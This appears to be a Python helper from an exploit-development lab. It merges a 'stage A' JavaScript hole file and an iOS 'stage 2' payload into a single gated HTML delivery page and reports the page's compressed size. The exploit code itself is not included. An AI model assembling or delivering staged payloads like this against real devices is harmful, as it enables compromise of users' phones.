import sys, zlib, re
A=open('/tmp/opencode/hole_stageA.js').read()
B=open('<HOME>/ailocal/Telegram/telegramandroidwidget/lab/qjs_postsnapshot/ios_n1/payload/n1ios_stage2_ab72.js').read()
# tops gate: insert after var PAT definition
A=A.replace('var PAT=', 'var PAT=',1)
gate='if (globalThis.PAT !== PAT) { globalThis.RESULT="RESULT NO_TOPS"; try{document.getElementById("v").textContent=globalThis.RESULT;}catch(e){} } else {\n'
# find the line after the PAT definition and wrap the rest in else
lines=A.split('\n')
out=[]
inserted=False
for i,l in enumerate(lines):
    out.append(l)
    if not inserted and l.strip().startswith('var PAT='):
        out.append(gate)
        inserted=True
A='\n'.join(out)
# close else at end
A=A+'\n}\n'
html='''<!doctype html><html><head><meta charset="utf-8"></head><body>
<div id="v">N1IOS_HOLE</div>
<script>%s</script>
<script>if(globalThis.AB){%s}</script>
</body></html>''' % (A,B)
open('<HOME>/ailocal/Telegram/telegramandroidwidget/lab/ios_way/payload/hole_stageA_final.html','w').write(html)
print("html raw",len(html),"zlib9",len(zlib.compress(html.encode(),9)))
